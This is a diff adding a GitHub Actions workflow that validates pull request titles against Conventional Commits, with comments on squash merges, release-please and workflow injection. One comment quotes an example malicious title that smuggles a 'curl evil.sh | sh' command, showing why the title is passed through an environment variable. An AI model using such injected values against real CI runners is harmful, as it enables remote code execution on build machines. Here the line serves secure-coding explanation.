@@ -1,0 +1,50 @@
+# The pull request title is the only text that reaches main: merges are squashed and the
+# repository is set to take the squash subject from the PR title. release-please reads those
+# subjects to build the changelog and pick the next version, so a title that does not follow
+# Conventional Commits silently disappears from the release notes.
+#
+# Deliberately not an action and not a git hook. The rule is one regular expression on one
+# string, so a third-party dependency buys nothing, and a local hook would not run for a
+# contributor who never installs it.
+name: PR title
+
+on:
+  pull_request:
+    # edited: renaming a rejected title re-runs the check.
+    # synchronize: keeps the result attached to the newest commit, so a required status check
+    # cannot go stale against the head SHA.
+    types: [opened, edited, reopened, synchronize]
+
+# The title arrives in the event payload. Nothing is read from the API, so no token is needed.
+permissions: {}
+
+jobs:
+  conventional-title:
+    name: Conventional Commits title
+    runs-on: ubuntu-latest
+    steps:
+      - name: Validate the PR title
+        env:
+          # Bound to an environment variable on purpose. A ${{ }} expression written inside
+          # run: is substituted into the script before bash parses it, so a title such as
+          #   a"; curl evil.sh | sh; #
+          # would execute on the runner. Through env: the value is only ever data.
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          set -euo pipefail
+
+          # Quote the subject, never the pattern: quoting the right-hand side of =~ turns it
+          # into a literal string instead of a regular expression.
+          pattern='^(build|chore|ci|docs|feat|fix|perf|refactor|revert|style|test)(\([a-z0-9._/-]+\))?!?: .+'
+
+          if [[ ! "$PR_TITLE" =~ $pattern ]]; then
+            echo "::error::The pull request title must follow Conventional Commits."
+            printf '\nGot:      %s\n' "$PR_TITLE"
+            printf 'Expected: <type>[(scope)][!]: <description>\n'
+            printf 'Types:    build chore ci docs feat fix perf refactor revert style test\n'
+            printf 'Example:  feat(artifacts): keep uploaded files permanently\n\n'
+            printf 'Edit the title in the browser and this check re-runs on its own.\n'
+            exit 1
+          fi
+
+          printf 'OK: %s\n' "$PR_TITLE"
